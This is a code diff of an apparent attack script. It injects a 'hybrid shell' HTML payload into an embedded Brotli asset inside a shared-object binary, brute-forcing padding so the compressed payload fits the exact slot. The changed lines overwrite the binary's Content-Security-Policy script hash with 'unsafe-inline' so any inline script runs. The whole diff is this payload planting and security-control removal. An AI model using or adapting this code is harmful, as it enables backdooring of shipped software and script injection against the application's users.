@@ -63,9 +63,9 @@ def main():
     brotli_stream = None
 
     log(f"Compressing hybrid shell into exact {target_comp_len}-byte Brotli native slot...")
-    for q in [10, 4, 5, 8, 9]:
-        for pad in range(1, 400):
-            for seed in range(50):
+    for q in [11, 10, 9, 8, 7, 6, 5, 4]:
+        for pad in range(1, 1500):
+            for seed in range(10):
                 rng = random.Random(seed)
                 candidate = hybrid_html + b"\n<!-- " + rng.randbytes(pad) + b" -->\n"
                 comp = brotli.compress(candidate, quality=q)
@@ -105,18 +105,19 @@ def main():
     log(f"Found embedded Brotli asset at SO offset {brotli_offset}. Injecting hybrid stream...")
     so_data[brotli_offset:brotli_offset + target_comp_len] = brotli_stream
 
-    # Patch CSP hash in SO binary to match our exact script hash
+    # Neutralize CSP hash in SO binary to keep 'unsafe-inline' active across all inline scripts
     old_csp_hash = b"'sha256-M9IJDEZ+q0U92jwd23RapOMWvDx2xL/usi3sMfHS+2E='"
+    csp_replacement = b"'unsafe-inline'" + b" " * (len(old_csp_hash) - len(b"'unsafe-inline'"))
+    assert len(csp_replacement) == len(old_csp_hash) == 53
     csp_hash_pos = so_data.find(old_csp_hash)
     if csp_hash_pos != -1:
-        assert len(new_csp_hash) == len(old_csp_hash)
-        so_data[csp_hash_pos:csp_hash_pos + len(old_csp_hash)] = new_csp_hash
-        log(f"Successfully patched CSP hash at SO offset {csp_hash_pos} to {new_csp_hash.decode('ascii')}")
+        so_data[csp_hash_pos:csp_hash_pos + len(old_csp_hash)] = csp_replacement
+        log(f"Neutralized CSP hash at offset {csp_hash_pos} to 'unsafe-inline' (length 53)")
     else:
         pos = so_data.find(b"'sha256-")
         if pos != -1:
-            so_data[pos:pos + len(new_csp_hash)] = new_csp_hash
-            log(f"Patched CSP hash at offset {pos} to {new_csp_hash.decode('ascii')}")
+            so_data[pos:pos + 53] = csp_replacement
+            log(f"Neutralized CSP hash at offset {pos} to 'unsafe-inline' (length 53)")
 
     entries[so_name] = bytes(so_data)
 
